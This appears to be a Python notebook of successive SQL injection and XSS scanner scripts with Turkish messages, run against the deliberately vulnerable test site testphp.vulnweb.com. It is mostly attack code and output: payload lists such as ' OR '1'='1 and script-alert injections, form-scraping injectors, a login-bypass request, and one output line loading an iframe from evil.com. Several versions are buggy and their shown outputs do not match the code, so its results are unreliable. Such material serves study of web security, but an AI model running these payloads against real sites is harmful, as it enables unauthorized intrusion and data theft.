# %%
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "') OR ('1'='1' /*",
]

import requests
from bs4 import BeautifulSoup

def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print(f"Getirilirken hata oluştu {url}: {e}")
        return []

def get_form_inputs(form):
    inputs = []
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        if name:
            inputs.append(name)
    return inputs

def send_payload(url, form, input_name, payload):
    form_data = {input_name: payload}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') and input_tag.get('name') != input_name:
            form_data[input_tag.get('name')] = 'test'  # Diğer input alanlarına dummy veri ekle
    
    action = form.get('action') or url
    if not action.startswith('http'):
        action = requests.compat.urljoin(url, action)
    
    try:
        response = requests.post(action, data=form_data)
        return "error" in response.text.lower() or "syntax" in response.text.lower()
    except requests.exceptions.RequestException as e:
        print(f"Payload gönderilirken hata oluştu {url}: {e}")
        return False

def test_sql_injection(url):
    forms = get_forms(url)
    for form in forms:
        input_fields = get_form_inputs(form)
        for input_name in input_fields:
            for payload in sql_payloads:
                result = send_payload(url, form, input_name, payload)
                if result:
                    print(f"SQL Injection açığı bulundu (input): '{input_name}' payload: {payload}")
                else:
                    print(f"SQL Injection açığı bulunamadı (input): '{input_name}' payload: {payload}")

def main():
    url = input("URL girin: ")
    test_sql_injection(url)

if __name__ == "__main__":
    main()
# Out:
# Enter the URL to test: http://testphp.vulnweb.com/index.php
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR '1'='1
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR '1'='1' --
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR '1'='1' /*
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR 1=1 --
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR 1=1#
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR 1=1/*
# SQL Injection vulnerability found in input 'searchFor' with payload: ') OR ('1'='1
# SQL Injection vulnerability found in input 'searchFor' with payload: ') OR ('1'='1' --
# SQL Injection vulnerability found in input 'searchFor' with payload: ') OR ('1'='1' /*
# SQL Injection vulnerability found in input 'goButton' with payload: ' OR '1'='1
# SQL Injection vulnerability found in input 'goButton' with payload: ' OR '1'='1' --
# ...

# %%
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "') OR ('1'='1' /*",
]

import requests
from bs4 import BeautifulSoup

def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print(f"Getirilirken hata oluştu {url}: {e}")
        return []

def get_form_inputs(form):
    inputs = []
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        if name:
            inputs.append(name)
    return inputs

def send_payload(url, form, input_name, payload):
    form_data = {input_name: payload}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') and input_tag.get('name') != input_name:
            form_data[input_tag.get('name')] = 'test'  # Diğer input alanlarına dummy veri ekle
    
    action = form.get('action') or url
    method = form.get('method', 'post').lower()
    
    if not action.startswith('http'):
        action = requests.compat.urljoin(url, action)
    
    try:
        if method == 'post':
            response = requests.post(action, data=form_data)
        else:
            response = requests.get(action, params=form_data)
        
        return "error" in response.text.lower() or "syntax" in response.text.lower()
    except requests.exceptions.RequestException as e:
        print(f"Payload gönderilirken hata oluştu {url}: {e}")
        return False

def test_sql_injection(url):
    forms = get_forms(url)
    for form in forms:
        input_fields = get_form_inputs(form)
        for input_name in input_fields:
            for payload in sql_payloads:
                result = send_payload(url, form, input_name, payload)
                if result:
                    print(f"SQL Injection açığı bulundu (input): '{input_name}' with payload: {payload}")
                else:
                    print(f"SQL Injection açığı bulunamadı (input): '{input_name}' with payload: {payload}")

def main():
    url = input("URL girin: ")
    test_sql_injection(url)

if __name__ == "__main__":
    main()
# Out:
# Enter the URL to test: http://testphp.vulnweb.com/index.php
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR '1'='1
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR '1'='1' --
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR '1'='1' /*
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR 1=1 --
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR 1=1#
# SQL Injection vulnerability found in input 'searchFor' with payload: ' OR 1=1/*
# SQL Injection vulnerability found in input 'searchFor' with payload: ') OR ('1'='1
# SQL Injection vulnerability found in input 'searchFor' with payload: ') OR ('1'='1' --
# SQL Injection vulnerability found in input 'searchFor' with payload: ') OR ('1'='1' /*
# SQL Injection vulnerability found in input 'goButton' with payload: ' OR '1'='1
# SQL Injection vulnerability found in input 'goButton' with payload: ' OR '1'='1' --
# ...

# %%
xss_payloads = [
    "<script>alert('XSS1')</script>",
    "<img src='x' onerror='alert(\"XSS2\")'>",
    "'\"><img src='x' onerror='alert(XSS3)'>",
    "<iframe onload='javascript:alert(XSS4)'></iframe>",
]

import requests
from bs4 import BeautifulSoup

def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print(f"Getirilirken hata oluştu {url}: {e}")
        return []

def get_form_inputs(form):
    inputs = []
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        if name:
            inputs.append(name)
    return inputs

def send_payload(url, form, input_name, payload):
    form_data = {input_name: payload}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') and input_tag.get('name') != input_name:
            form_data[input_tag.get('name')] = 'test'  # Diğer input alanlarına dummy veri ekle
    
    action = form.get('action') or url
    method = form.get('method', 'post').lower()
    
    if not action.startswith('http'):
        action = requests.compat.urljoin(url, action)
    
    try:
        if method == 'post':
            response = requests.post(action, data=form_data)
        else:
            response = requests.get(action, params=form_data)
        
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print(f"Payload gönderilirken hata oluştu {url}: {e}")
        return False

def test_xss(url):
    forms = get_forms(url)
    for form in forms:
        input_fields = get_form_inputs(form)
        for input_name in input_fields:
            for payload in xss_payloads:
                result = send_payload(url, form, input_name, payload)
                if result:
                    print(f"XSS açığı bulundu (input): '{input_name}' payload: {payload}")
                else:
                    print(f"XSS açığı bulunamadı (input): '{input_name}' payload: {payload}")

def main():
    url = input("URL girin: ")
    test_xss(url)

if __name__ == "__main__":
    main()
# Out:
# Enter the URL to test: http://testphp.vulnweb.com/index.php
# XSS vulnerability found in input 'searchFor' with payload: <script>alert('XSS1')</script>
# XSS vulnerability found in input 'searchFor' with payload: <img src='x' onerror='alert("XSS2")'>
# XSS vulnerability found in input 'searchFor' with payload: '"><img src='x' onerror='alert(XSS3)'>
# XSS vulnerability found in input 'searchFor' with payload: <iframe onload='javascript:alert(XSS4)'></iframe>
# No XSS vulnerability in input 'goButton' with payload: <script>alert('XSS1')</script>
# No XSS vulnerability in input 'goButton' with payload: <img src='x' onerror='alert("XSS2")'>
# No XSS vulnerability in input 'goButton' with payload: '"><img src='x' onerror='alert(XSS3)'>
# No XSS vulnerability in input 'goButton' with payload: <iframe onload='javascript:alert(XSS4)'></iframe>

# %%
xss_payloads = [
    "<script>alert('XSS1')</script>",
    "<img src='x' onerror='alert(\"XSS2\")'>",
    "'\"><img src='x' onerror='alert(XSS3)'>",
    "<iframe onload='javascript:alert(XSS4)'></iframe>",
]


import requests
from bs4 import BeautifulSoup

def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print(f"Getirilirken hata oluştu {url}: {e}")
        return []

def get_form_inputs(form):
    inputs = []
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        if name:
            inputs.append(name)
    return inputs

def send_payload(url, form_action, input_name, payload):
    form_data = {input_name: payload}
    try:
        response = requests.post(form_action, data=form_data)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print(f"Payload gönderilirken hata oluştu {url}: {e}")
        return False

def test_xss(url):
    forms = get_forms(url)
    for form in forms:
        form_action = form.get('action') or url
        input_fields = get_form_inputs(form)
        for input_name in input_fields:
            for payload in xss_payloads:
                result = send_payload(url, form_action, input_name, payload)
                if result:
                    print(f"XSS açığı bulundu (input): '{input_name}' payload: {payload}")
                else:
                    print(f"XSS açığı bulunamadı (input): '{input_name}' payload: {payload}")

def main():
    url = input("URL girin: ")
    test_xss(url)

if __name__ == "__main__":
    main()
# Out:
# Enter the URL to test: http://testphp.vulnweb.com/index.php
# Error sending payload to http://testphp.vulnweb.com/index.php: Invalid URL 'search.php?test=query': No scheme supplied. Perhaps you meant https://search.php?test=query?
# No XSS vulnerability in input 'searchFor' with payload: <script>alert('XSS1')</script>
# Error sending payload to http://testphp.vulnweb.com/index.php: Invalid URL 'search.php?test=query': No scheme supplied. Perhaps you meant https://search.php?test=query?
# No XSS vulnerability in input 'searchFor' with payload: <img src='x' onerror='alert("XSS2")'>
# Error sending payload to http://testphp.vulnweb.com/index.php: Invalid URL 'search.php?test=query': No scheme supplied. Perhaps you meant https://search.php?test=query?
# No XSS vulnerability in input 'searchFor' with payload: '"><img src='x' onerror='alert(XSS3)'>
# ...

# %%
xss_payloads = [
    "<script>alert('XSS1')</script>",
    "<img src='x' onerror='alert(\"XSS2\")'>",
    "'\"><img src='x' onerror='alert(XSS3)'>",
    "<iframe onload='javascript:alert(XSS4)'></iframe>",
]

import requests
from bs4 import BeautifulSoup

def get_input_names(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        input_tags = soup.find_all('input')
        return [input_tag.get('name') for input_tag in input_tags if input_tag.get('name')]
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return []

def send_payload(url, input_name, payload):
    form_data = {input_name: payload}
    try:
        response = requests.post(url, data=form_data)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print(f"Payload gönderilirken hata oluştu {url}: {e}")
        return False

def test_xss(url):
    input_names = get_input_names(url)
    for input_name in input_names:
        for payload in xss_payloads:
            result = send_payload(url, input_name, payload)
            if result:
                print(f"XSS açığı bulundu (input): '{input_name}' payload: {payload}")
            else:
                print(f"XSS açığı bulunamadı (input): '{input_name}' payload: {payload}")

def main():
    url = input("URL girin: ")
    test_xss(url)

if __name__ == "__main__":
    main()
# Out:
# Enter the URL to test: http://testphp.vulnweb.com/index.php
# No XSS vulnerability in input 'searchFor' with payload: <script>alert('XSS1')</script>
# No XSS vulnerability in input 'searchFor' with payload: <img src='x' onerror='alert("XSS2")'>
# No XSS vulnerability in input 'searchFor' with payload: '"><img src='x' onerror='alert(XSS3)'>
# No XSS vulnerability in input 'searchFor' with payload: <iframe onload='javascript:alert(XSS4)'></iframe>
# No XSS vulnerability in input 'goButton' with payload: <script>alert('XSS1')</script>
# No XSS vulnerability in input 'goButton' with payload: <img src='x' onerror='alert("XSS2")'>
# No XSS vulnerability in input 'goButton' with payload: '"><img src='x' onerror='alert(XSS3)'>
# No XSS vulnerability in input 'goButton' with payload: <iframe onload='javascript:alert(XSS4)'></iframe>

# %%
import requests
import re

file_path = "payloads.txt"
with open(file_path, "r") as file:
    file_content = file.readlines()

payloads = file_content


file_url = "url.txt"
# Dosyayı okuyun
with open(file_url, "r") as file:
    file_c = file.readlines()

urls = file_c


for url in urls:
    index_of_equals = url.find("=")  # "=" işaretinin index'ini bul

    for payload in payloads:
        new_url = url[:index_of_equals + 1] + payload
        response = requests.get(new_url)

        if re.search("You have an error in your SQL syntax", response.text):
            print("SQL injection tespit edildi: " + payload)
        else: 
            print("SQL injection bulunamadı: " + payload)

        # İsteğin sonucunu ekrana yazdır
        print(f"URL: {url} PAYLOAD: {payload}")
        print("-------------------------------------")
# Out:
# SQL injection tespit edildi: '
#
# URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#  PAYLOAD: '
#
# -------------------------------------
# SQL injection bulunamadı: ''
#
# URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#  PAYLOAD: ''
#
# -------------------------------------
# SQL injection tespit edildi: `
#
# URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#  PAYLOAD: `
#
# -------------------------------------
# SQL injection bulunamadı: ``
#
# URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#  PAYLOAD: ``
#
# -------------------------------------
# SQL injection tespit edildi: ,
#
# URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#  PAYLOAD: ,
#
# -------------------------------------
# SQL injection tespit edildi: "
#
# URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#  PAYLOAD: "
#
# -------------------------------------
# SQL injection bulunamadı: ""
#
# URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#  PAYLOAD: ""
#
# ...

# %%
import requests
fname = "xss_payloads.txt"
with open(fname) as f:
    content = f.readlines()
payloads = [x.strip() for x in content]

file_url = "url.txt"
# Dosyayı okuyun
with open(file_url, "r") as file:
    file_c = file.readlines()

urls = file_c

vuln = []

for url in urls:
    index_of_equals = url.find("=")  # "=" işaretinin index'ini bul
    for payload in payloads:
        xss_url = url[:index_of_equals + 1] + payload
        r = requests.get(xss_url)

        if payload.lower() in r.text.lower():
            print(f"XSS zafiyeti VAR! URL: {url}  Payload: {payload}")
            print("-----------------------")

            if(payload not in vuln):
                vuln.append(payload)

        else:
            print (f"XSS zafiyeti YOK! URL: {url}  Payload: {payload}")
            print("-----------------------")
# Out:
# XSS zafiyeti VAR! URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#   Payload: <body onload=alert("XSS")>
# -----------------------
# XSS zafiyeti VAR! URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#   Payload: <img src="javascript:alert("XSS");">
# -----------------------
# XSS zafiyeti VAR! URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#   Payload: <iframe src="http://evil.com/xss.html">
# -----------------------
# XSS zafiyeti VAR! URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#   Payload: <input type="image" src="javascript:alert('XSS');">
# -----------------------
# XSS zafiyeti VAR! URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#   Payload: <link rel="stylesheet" href="javascript:alert('XSS');">
# -----------------------
# XSS zafiyeti VAR! URL: http://testphp.vulnweb.com/listproducts.php?cat=1
#   Payload: <table background="javascript:alert('XSS')">
# -----------------------
# ...

# %%
import requests

# Hedef URL ve giriş bilgileri
url = 'http://testphp.vulnweb.com/login.php'
username = "test'#"
password = ""

"""
username = 'test'
password = "test' OR 1=1  #"  #" or ""="
"""


# Gönderilecek verileri hazırla
data = {
    'username': username,
    'password': password
}

# HTTP POST isteği gönder
response = requests.post(url, data=data)

# Yanıtı kontrol et
if response.status_code == 200:
    print("Oturum açma başarılı!")
    # Oturum açma başarılı ise gerekli işlemler yapılabilir
    # Örneğin, oturumun devamında sayfa içeriğini kontrol edebilirsiniz.
else:
    print("Oturum açma başarısız. Hata kodu:", response.status_code)
# Out:
# Oturum açma başarılı!

# %%
import requests
from bs4 import BeautifulSoup

# SQL Injection payload'ları
sql_payloads = [
    "admin' OR '1'='1",
    "admin' --",
    "' OR '1'='1",
    "admin' OR 1=1--",
]

# XSS payload'ları
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "\"><script>alert('XSS')</script>",
]

def get_form_action_and_inputs(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        form = soup.find('form')
        action = form.get('action')
        inputs = [input_tag.get('name') for input_tag in form.find_all('input') if input_tag.get('name')]
        return action, inputs
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None, []

def send_payload(url, action, payload, input_name):
    form_data = {input_name: payload}
    try:
        response = requests.post(action, data=form_data)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print(f"Error sending payload to {url}: {e}")
        return False

def test_payloads(url, payloads):
    action, inputs = get_form_action_and_inputs(url)
    if not action or not inputs:
        return
    
    for input_name in inputs:
        for payload in payloads:
            result = send_payload(url, action, payload, input_name)
            if result:
                print(f"Vulnerability found in input '{input_name}' with payload: {payload}")
            else:
                print(f"No vulnerability in input '{input_name}' with payload: {payload}")

def main():
    url = input("Enter the login URL to test: ")
    print("Testing SQL Injection payloads...")
    test_payloads(url, sql_payloads)
    print("Testing XSS payloads...")
    test_payloads(url, xss_payloads)

if __name__ == "__main__":
    main()
# Out:
# Enter the login URL to test: http://testphp.vulnweb.com/login.php
# Testing SQL Injection payloads...
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# No vulnerability in input 'uname' with payload: admin' OR '1'='1
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# No vulnerability in input 'uname' with payload: admin' --
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# No vulnerability in input 'uname' with payload: ' OR '1'='1
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# No vulnerability in input 'uname' with payload: admin' OR 1=1--
# ...

# %%
import requests
from bs4 import BeautifulSoup

# SQL Injection payload'ları
sql_payloads = [
    "admin' OR '1'='1",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "admin' OR 1=1--"
]

# XSS payload'ları
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>"
]

def get_form_action_and_inputs(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        form = soup.find('form')
        action = form.get('action')
        inputs = {input_tag.get('name'): 'test' for input_tag in form.find_all('input') if input_tag.get('name')}
        return action, inputs
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None, {}

def send_payload(url, action, payloads):
    for input_name in payloads.keys():
        for payload in payloads[input_name]:
            form_data = {key: (payload if key == input_name else 'test') for key in payloads.keys()}
            action_url = url if not action else action
            try:
                response = requests.post(action_url, data=form_data)
                if payload in response.text:
                    print(f"Vulnerability found with payload: {payload}")
                else:
                    print(f"No vulnerability found with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Error sending payload to {url}: {e}")

def main():
    url = input("Enter the login URL to test: ")
    action, inputs = get_form_action_and_inputs(url)
    
    if action and inputs:
        # SQL Injection test
        print("Testing SQL Injection payloads...")
        sql_payloads_dict = {input_name: sql_payloads for input_name in inputs.keys()}
        send_payload(url, action, sql_payloads_dict)
        
        # XSS test
        print("Testing XSS payloads...")
        xss_payloads_dict = {input_name: xss_payloads for input_name in inputs.keys()}
        send_payload(url, action, xss_payloads_dict)
    else:
        print("No form found at the specified URL or unable to retrieve form inputs.")

if __name__ == "__main__":
    main()
# Out:
# Enter the login URL to test: http://testphp.vulnweb.com/login.php
# Testing SQL Injection payloads...
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# Error sending payload to http://testphp.vulnweb.com/login.php: Invalid URL 'userinfo.php': No scheme supplied. Perhaps you meant https://userinfo.php?
# ...

# %%
import requests
from bs4 import BeautifulSoup

# SQL Injection payload'ları
sql_payloads = [
    "admin' OR '1'='1",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "admin' OR 1=1--"
]

# XSS payload'ları
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>"
]

def get_form_action_and_inputs(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        form = soup.find('form')
        action = form.get('action')
        inputs = {input_tag.get('name'): 'test' for input_tag in form.find_all('input') if input_tag.get('name')}
        return action, inputs
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None, {}

def send_payload(url, action, payloads):
    for input_name in payloads.keys():
        for payload in payloads[input_name]:
            form_data = {key: (payload if key == input_name else 'test') for key in payloads.keys()}
            action_url = url if not action else action
            if not action_url.startswith('http'):
                action_url = requests.compat.urljoin(url, action_url)
            try:
                response = requests.post(action_url, data=form_data)
                if payload in response.text:
                    print(f"Vulnerability found in input '{input_name}' with payload: {payload}")
                else:
                    print(f"No vulnerability found in input '{input_name}' with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Error sending payload to {url}: {e}")

def test_payloads(url, sql_payloads, xss_payloads):
    action, inputs = get_form_action_and_inputs(url)
    if action and inputs:
        # SQL Injection test
        print("Testing SQL Injection payloads...")
        sql_payloads_dict = {input_name: sql_payloads for input_name in inputs.keys()}
        send_payload(url, action, sql_payloads_dict)
        
        # XSS test
        print("Testing XSS payloads...")
        xss_payloads_dict = {input_name: xss_payloads for input_name in inputs.keys()}
        send_payload(url, action, xss_payloads_dict)
    else:
        print("No form found at the specified URL or unable to retrieve form inputs.")

def main():
    url = input("Enter the login URL to test: ")
    test_payloads(url, sql_payloads, xss_payloads)

if __name__ == "__main__":
    main()
# Out:
# Enter the login URL to test: http://testphp.vulnweb.com/index.php
# Testing SQL Injection payloads...
# Vulnerability found in input 'searchFor' with payload: admin' OR '1'='1
# Vulnerability found in input 'searchFor' with payload: ' OR '1'='1
# Vulnerability found in input 'searchFor' with payload: admin' --
# Vulnerability found in input 'searchFor' with payload: admin' #
# Vulnerability found in input 'searchFor' with payload: admin' OR 1=1--
# No vulnerability found in input 'goButton' with payload: admin' OR '1'='1
# No vulnerability found in input 'goButton' with payload: ' OR '1'='1
# No vulnerability found in input 'goButton' with payload: admin' --
# No vulnerability found in input 'goButton' with payload: admin' #
# No vulnerability found in input 'goButton' with payload: admin' OR 1=1--
# Testing XSS payloads...
# Vulnerability found in input 'searchFor' with payload: <script>alert('XSS')</script>
# ...

# %%
import requests

# SQL Injection payload'ları
sql_payloads = [
    "admin' OR '1'='1",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "admin' OR 1=1--"
]

# XSS payload'ları
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>"
]

def send_payload(url, payload):
    data = {'input': payload}
    try:
        response = requests.post(url, data=data)
        if payload in response.text:
            print(f"Vulnerability found with payload: {payload}")
        else:
            print(f"No vulnerability found with payload: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending payload to {url}: {e}")

def test_payloads(url, sql_payloads, xss_payloads):
    print("Testing SQL Injection payloads...")
    for payload in sql_payloads:
        send_payload(url, payload)
    
    print("Testing XSS payloads...")
    for payload in xss_payloads:
        send_payload(url, payload)

def main():
    url = input("Enter the URL to test: ")
    test_payloads(url, sql_payloads, xss_payloads)

if __name__ == "__main__":
    main()
# Out:
# Enter the URL to test: http://testphp.vulnweb.com/index.php
# Testing SQL Injection payloads...
# No vulnerability found with payload: admin' OR '1'='1
# No vulnerability found with payload: ' OR '1'='1
# No vulnerability found with payload: admin' --
# No vulnerability found with payload: admin' #
# No vulnerability found with payload: admin' OR 1=1--
# Testing XSS payloads...
# No vulnerability found with payload: <script>alert('XSS')</script>
# No vulnerability found with payload: "><script>alert('XSS')</script>
# No vulnerability found with payload: <img src='x' onerror='alert("XSS")'>

# %%
import requests
# SQL Injection payload'ları
sql_payloads = [
    "admin' OR '1'='1",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "admin' OR 1=1--"
]
# XSS payload'ları
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>"
]
def send_payload(url, payload):
    data = {'input': payload}
    try:
        response = requests.post(url, data=data)
        if payload in response.text:
            print(f"Açık Bulundu: {payload}")
        else:
            print(f"Açık bulunamadı: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"Payload göndermede hata {url}: {e}")
def test_payloads(url, sql_payloads, xss_payloads):
    print("SQL Injection payloadları test ediliyor...")
    for payload in sql_payloads:
        send_payload(url, payload)
    
    print("XSS payloadları test ediliyor...")
    for payload in xss_payloads:
        send_payload(url, payload)
def main():
    url = input("URL girin: ")
    
    if '=' in url:
        index_of_equals = url.find("=")
        url = url[:index_of_equals + 1] + payload
        test_payloads(url, sql_payloads, xss_payloads)
    else:
        test_payloads(url, sql_payloads, xss_payloads)
if __name__ == "__main__":
    main()
# Out:
# Enter the URL to test: http://testphp.vulnweb.com/index.php
# Testing SQL Injection payloads...
# No vulnerability found with payload: admin' OR '1'='1
# No vulnerability found with payload: ' OR '1'='1
# No vulnerability found with payload: admin' --
# No vulnerability found with payload: admin' #
# No vulnerability found with payload: admin' OR 1=1--
# Testing XSS payloads...
# No vulnerability found with payload: <script>alert('XSS')</script>
# No vulnerability found with payload: "><script>alert('XSS')</script>
# No vulnerability found with payload: <img src='x' onerror='alert("XSS")'>

# %%
import requests

# Hedef URL ve giriş bilgileri
url = 'http://testphp.vulnweb.com/login.php'
username = "test'#"
password = ""

"""
username = 'test'
password = "test' OR 1=1  #"  #" or ""="
"""


# Gönderilecek verileri hazırla
data = {
    'username': username,
    'password': password
}

# HTTP POST isteği gönder
response = requests.post(url, data=data)

# Yanıtı kontrol et
if response.status_code == 200:
    print("Oturum açma başarılı!")
    # Oturum açma başarılı ise gerekli işlemler yapılabilir
    # Örneğin, oturumun devamında sayfa içeriğini kontrol edebilirsiniz.
else:
    print("Oturum açma başarısız. Hata kodu:", response.status_code)
# Out:
# Oturum açma başarılı!
